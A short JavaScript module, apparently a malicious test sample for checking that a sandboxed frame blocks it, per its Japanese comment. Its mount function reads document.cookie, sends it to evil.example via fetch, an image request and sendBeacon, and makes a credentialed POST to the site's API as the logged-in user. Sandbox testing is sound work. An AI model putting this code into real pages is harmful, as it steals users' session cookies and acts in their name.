// 悪意のある見本：cookie を読み、外へ送る。枠の中では全部失敗する（README.md）。
export function mount(root) {
  let stolen = '';
  try {
    stolen = document.cookie;
    root.setAttribute('data-cookie', 'read');
  } catch (error) {
    root.setAttribute('data-cookie', `blocked:${error.name}`);
  }

  const url = `https://evil.example/steal?c=${encodeURIComponent(stolen)}`;
  fetch(url, { mode: 'no-cors' }).then(
    () => root.setAttribute('data-fetch', 'sent'),
    () => root.setAttribute('data-fetch', 'blocked'),
  );
  new Image().src = `${url}&via=image`;
  try {
    navigator.sendBeacon(`${url}&via=beacon`, stolen);
  } catch {
    // 止まっても次へ
  }
  // サイトの API も、ログインした本人のふりをして叩こうとする
  fetch('/api/count', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ work_id: 'mal-cookie', type: 'copy' }),
  }).then(
    () => root.setAttribute('data-api', 'sent'),
    () => root.setAttribute('data-api', 'blocked'),
  );
  return () => {};
}
